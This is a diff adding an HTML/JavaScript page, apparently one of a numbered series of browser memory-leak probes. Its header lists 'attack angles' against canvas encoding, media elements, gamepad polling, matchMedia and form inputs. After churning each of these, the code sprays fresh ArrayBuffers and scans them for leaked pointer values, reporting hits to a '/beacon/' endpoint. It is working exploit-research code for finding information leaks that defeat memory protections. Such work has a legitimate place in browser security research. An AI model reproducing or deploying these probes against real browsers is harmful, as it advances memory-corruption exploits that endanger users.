@@ -1,0 +1,442 @@
+<!--
+  p787: Canvas toBlob/toDataURL encoding / HTMLMediaElement / Gamepad / Screen residue
+
+  Canvas toBlob() and toDataURL() invoke C++ image encoding pipelines
+  (PNG encoder, JPEG encoder) that allocate intermediate row buffers,
+  filter buffers, and compression state. Each call creates and destroys
+  encoder objects from the platform image codec allocator, which is
+  separate from bmalloc. Rapid encode/discard cycles exercise this pool.
+
+  HTMLMediaElement (audio/video) creates C++ MediaPlayer, AudioTrack,
+  VideoTrack, TimeRanges, TextTrack objects. Even without actual media
+  data, creating elements and setting src to invalid URLs exercises the
+  media pipeline's error handling path, which allocates and frees
+  C++ MediaError, Promise rejection records, and event queue entries.
+
+  Gamepad API: navigator.getGamepads() returns a C++ GamepadList with
+  Gamepad objects containing axes/buttons arrays. Polling exercises
+  the platform gamepad provider's C++ state objects.
+
+  Screen/matchMedia: window.matchMedia() creates C++ MediaQueryList
+  objects with parsed media query ASTs. Each listener registration
+  allocates C++ MediaQueryListListener records. screen property access
+  creates C++ ScreenData snapshots.
+
+  input element state: HTMLInputElement maintains C++ InputType objects
+  with validation state, selection range, and value sanitization state.
+  Switching types exercises the type-specific C++ backing objects.
+
+  form validation: setCustomValidity/checkValidity/reportValidity
+  exercise the C++ ValidityState object and its constraint checking.
+
+  Attack angles:
+  A) Canvas toBlob/toDataURL PNG/JPEG encoding churn.
+  B) HTMLMediaElement create/error/destroy churn.
+  C) Gamepad API polling residue.
+  D) matchMedia query list create/remove churn.
+  E) Input element type switching + validation state.
+  F) Form validation constraint checking churn.
+
+  CRASH_CLASS: LOW (canvas/media/input APIs, no side effects)
+  prior art: p771 (ImageBitmap), p629 (Canvas2D struct mapping)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p787</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p787-START');
+
+// === Section A: Canvas toBlob/toDataURL encoding churn ===
+try{
+  b('A-canvas-encode');
+  var aHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var blobs=[];
+
+      for(var i=0;i<30;i++){
+        var c=document.createElement('canvas');
+        c.width=64+i*4;
+        c.height=64+i*4;
+        var ctx=c.getContext('2d');
+
+        // Draw varied content to exercise different encoder paths
+        ctx.fillStyle='rgb('+(i*8)+','+(round*50)+','+(255-i*8)+')';
+        ctx.fillRect(0,0,c.width,c.height);
+        for(var j=0;j<10;j++){
+          ctx.fillStyle='rgba('+(j*25)+','+(j*10)+','+(255-j*20)+',0.7)';
+          ctx.fillRect(j*5,j*5,20+j,20+j);
+        }
+        ctx.strokeStyle='white';
+        ctx.lineWidth=2;
+        ctx.beginPath();
+        ctx.arc(c.width/2,c.height/2,20,0,Math.PI*2);
+        ctx.stroke();
+
+        // toDataURL exercises the sync encoding path
+        try{
+          var pngUrl=c.toDataURL('image/png');
+          if(i===0&&round===0)b('A png_url_len='+pngUrl.length);
+        }catch(e){}
+
+        try{
+          var jpgUrl=c.toDataURL('image/jpeg',0.5+i*0.01);
+          if(i===0&&round===0)b('A jpg_url_len='+jpgUrl.length);
+        }catch(e){}
+
+        // toBlob exercises the async encoding path
+        try{
+          c.toBlob(function(blob){
+            if(blob)blobs.push(blob);
+          },'image/png');
+        }catch(e){}
+
+        try{
+          c.toBlob(function(blob){
+            if(blob)blobs.push(blob);
+          },'image/jpeg',0.8);
+        }catch(e){}
+      }
+
+      if(round===0)b('A encoded 30 canvases x 4 formats (2 PNG + 2 JPEG)');
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    aHits+=sprayAndScan('A',round,[48,64,96,128,192]);
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: HTMLMediaElement create/error/destroy churn ===
+try{
+  b('B-media-element');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+
+      for(var i=0;i<40;i++){
+        var el;
+        if(i%2===0){
+          el=document.createElement('audio');
+        }else{
+          el=document.createElement('video');
+          el.width=160;
+          el.height=120;
+        }
+
+        el.preload='none';
+
+        // Set invalid src to exercise error path allocations
+        el.src='data:audio/wav;base64,invalid_'+round+'_'+i;
+
+        // Access properties that create C++ backing objects
+        try{var dur=el.duration;}catch(e){}
+        try{var ct=el.currentTime;}catch(e){}
+        try{var buf=el.buffered;}catch(e){}
+        try{var seek=el.seekable;}catch(e){}
+        try{var played=el.played;}catch(e){}
+        try{var err=el.error;}catch(e){}
+        try{var ns=el.networkState;}catch(e){}
+        try{var rs=el.readyState;}catch(e){}
+
+        // Add and remove text tracks
+        try{
+          var track=el.addTextTrack('subtitles','test_'+i,'en');
+          if(track){
+            track.mode='showing';
+            try{
+              track.addCue(new VTTCue(0,1,'cue_'+round+'_'+i));
+            }catch(e){}
+            track.mode='disabled';
+          }
+        }catch(e){}
+
+        elements.push(el);
+      }
+
+      if(round===0)b('B created '+elements.length+' media elements (20 audio + 20 video)');
+
+      // Force cleanup
+      for(var i=0;i<elements.length;i++){
+        elements[i].src='';
+        try{elements[i].load();}catch(e){}
+      }
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[48,64,96,128]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: Gamepad API polling residue ===
+try{
+  b('C-gamepad');
+  var cHits=0;
+
+  var gpSupported=!!navigator.getGamepads;
+  if(!gpSupported){
+    b('C-SKIP no getGamepads');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        // Poll gamepad state rapidly
+        for(var i=0;i<200;i++){
+          try{
+            var gamepads=navigator.getGamepads();
+            if(round===0&&i===0){
+              var count=0;
+              for(var g=0;g<gamepads.length;g++){
+                if(gamepads[g])count++;
+              }
+              b('C gamepads.length='+gamepads.length+' connected='+count);
+            }
+          }catch(e){
+            if(i===0&&round===0)b('C gp_err='+e.message);
+          }
+        }
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      cHits+=sprayAndScan('C',round,[32,48,64,96]);
+    }
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: matchMedia query list create/remove churn ===
+try{
+  b('D-matchmedia');
+  var dHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var queries=[];
+      var listeners=[];
+
+      var mediaStrings=[
+        '(min-width: 100px)','(max-width: 2000px)','(orientation: portrait)',
+        '(orientation: landscape)','(prefers-color-scheme: dark)',
+        '(prefers-color-scheme: light)','(prefers-reduced-motion: reduce)',
+        '(min-resolution: 72dpi)','(max-resolution: 300dpi)',
+        '(hover: hover)','(pointer: fine)','(pointer: coarse)',
+        'screen','print','(color)','(monochrome)',
+        '(min-height: 200px)','(max-height: 1200px)',
+        '(aspect-ratio: 16/9)','(min-aspect-ratio: 1/1)'
+      ];
+
+      for(var i=0;i<100;i++){
+        var mqStr=mediaStrings[i%mediaStrings.length];
+        // Add specificity via width variants
+        if(i>=20)mqStr='(min-width: '+(100+i*10)+'px)';
+
+        try{
+          var mql=window.matchMedia(mqStr);
+          var handler=function(e){};
+          if(mql.addEventListener){
+            mql.addEventListener('change',handler);
+          }else if(mql.addListener){
+            mql.addListener(handler);
+          }
+          queries.push(mql);
+          listeners.push(handler);
+        }catch(e){
+          if(i===0&&round===0)b('D mql_err='+e.message);
+        }
+      }
+
+      if(round===0){
+        b('D created '+queries.length+' MediaQueryLists with listeners');
+        if(queries[0])b('D sample matches='+queries[0].matches+' media='+queries[0].media);
+      }
+
+      // Remove listeners
+      for(var i=0;i<queries.length;i++){
+        try{
+          if(queries[i].removeEventListener){
+            queries[i].removeEventListener('change',listeners[i]);
+          }else if(queries[i].removeListener){
+            queries[i].removeListener(listeners[i]);
+          }
+        }catch(e){}
+      }
+      queries=null;listeners=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    dHits+=sprayAndScan('D',round,[32,48,64,96,128]);
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: Input element type switching + validation ===
+try{
+  b('E-input-types');
+  var eHits=0;
+
+  var inputTypes=['text','password','email','url','tel','number','search',
+    'date','time','datetime-local','month','week','color','range','hidden'];
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var inputs=[];
+
+      for(var i=0;i<50;i++){
+        var inp=document.createElement('input');
+        document.body.appendChild(inp);
+
+        // Cycle through types to exercise C++ InputType switching
+        for(var t=0;t<inputTypes.length;t++){
+          try{
+            inp.type=inputTypes[t];
+            inp.value='test_'+round+'_'+i+'_'+t;
+
+            // Access validation state
+            var v=inp.validity;
+            if(v){
+              var valid=v.valid;
+              var tooLong=v.tooLong;
+              var typeMismatch=v.typeMismatch;
+              var valueMissing=v.valueMissing;
+            }
+
+            // Selection API (only for text-like types)
+            try{
+              inp.setSelectionRange(0,inp.value.length);
+              var ss=inp.selectionStart;
+              var se=inp.selectionEnd;
+            }catch(e){}
+          }catch(e){}
+        }
+
+        inputs.push(inp);
+      }
+
+      if(round===0)b('E cycled 50 inputs through '+inputTypes.length+' types each');
+
+      for(var i=0;i<inputs.length;i++){
+        document.body.removeChild(inputs[i]);
+      }
+      inputs=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: Form validation constraint checking churn ===
+try{
+  b('F-form-validation');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var form=document.createElement('form');
+      form.noValidate=false;
+      document.body.appendChild(form);
+
+      var inputs=[];
+      for(var i=0;i<40;i++){
+        var inp=document.createElement('input');
+        inp.type=['email','url','number','text','tel'][i%5];
+        inp.required=(i%3===0);
+        inp.name='field_'+round+'_'+i;
+
+        if(inp.type==='number'){
+          inp.min='0';inp.max='100';inp.step='5';
+        }
+        if(inp.type==='text'){
+          inp.pattern='[a-z]+';
+          inp.minLength=2;
+          inp.maxLength=50;
+        }
+
+        form.appendChild(inp);
+        inputs.push(inp);
+      }
+
+      if(round===0)b('F created form with '+inputs.length+' constrained inputs');
+
+      // Set valid then invalid values, check validity each time
+      for(var i=0;i<inputs.length;i++){
+        // Valid value
+        switch(inputs[i].type){
+          case 'email': inputs[i].value='test@example.com'; break;
+          case 'url': inputs[i].value='https://example.com'; break;
+          case 'number': inputs[i].value='50'; break;
+          case 'tel': inputs[i].value='+1234567890'; break;
+          default: inputs[i].value='hello'; break;
+        }
+        try{inputs[i].checkValidity();}catch(e){}
+
+        // Invalid value
+        switch(inputs[i].type){
+          case 'email': inputs[i].value='not-an-email'; break;
+          case 'url': inputs[i].value='not-a-url'; break;
+          case 'number': inputs[i].value='999'; break;
+          case 'text': inputs[i].value='123'; break;
+          default: inputs[i].value=''; break;
+        }
+        try{inputs[i].checkValidity();}catch(e){}
+
+        // Custom validity
+        try{
+          inputs[i].setCustomValidity('custom_error_'+round+'_'+i);
+          inputs[i].checkValidity();
+          inputs[i].setCustomValidity('');
+        }catch(e){}
+      }
+
+      // Form-level check
+      try{form.checkValidity();}catch(e){}
+
+      if(round===0)b('F validated '+inputs.length+' inputs (valid + invalid + custom)');
+
+      document.body.removeChild(form);
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[32,48,64,96,128]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p787-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
